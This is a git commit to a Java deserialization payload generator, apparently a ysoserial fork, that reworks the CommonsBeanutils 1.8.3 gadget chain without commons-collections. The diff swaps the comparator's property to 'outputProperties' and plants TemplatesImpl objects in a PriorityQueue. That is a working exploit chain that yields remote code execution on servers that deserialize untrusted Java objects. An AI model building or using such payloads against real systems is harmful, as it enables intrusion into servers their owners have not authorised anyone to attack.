27161155b1f70acd60dfe023f9db1e2994906e70
phoebe buffay <su18@javaweb.org>
2023-01-13 09:16:09 +0800

    更新 CB2183

--- src/main/java/org/su18/ysuserial/payloads/CommonsBeanutils2183NOCC.java
+++ src/main/java/org/su18/ysuserial/payloads/CommonsBeanutils2183NOCC.java
@@ -5,8 +5,10 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
+import org.su18.ysuserial.payloads.util.Reflections;
 import org.su18.ysuserial.payloads.util.SuClassLoader;
 
+import java.math.BigInteger;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
@@ -28,17 +30,14 @@ public class CommonsBeanutils2183NOCC implements ObjectPayload<Object> {
 		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
 
 		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
-		setFieldValue(comparator, "property", null);
-		setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
-
-		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
-		// stub data for replacement later
-		queue.add("1");
-		queue.add("1");
-
+		setFieldValue(comparator, "property", "lowestSetBit");
+		PriorityQueue<Object> queue = new PriorityQueue(2, comparator);
+		queue.add(new BigInteger("1"));
+		queue.add(new BigInteger("1"));
 		setFieldValue(comparator, "property", "outputProperties");
-		setFieldValue(queue, "queue", new Object[]{templates, templates});
-		ctBeanComparator.defrost();
+		Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+		queueArray[0] = templates;
+		queueArray[1] = templates;
 		return queue;
 	}
 }
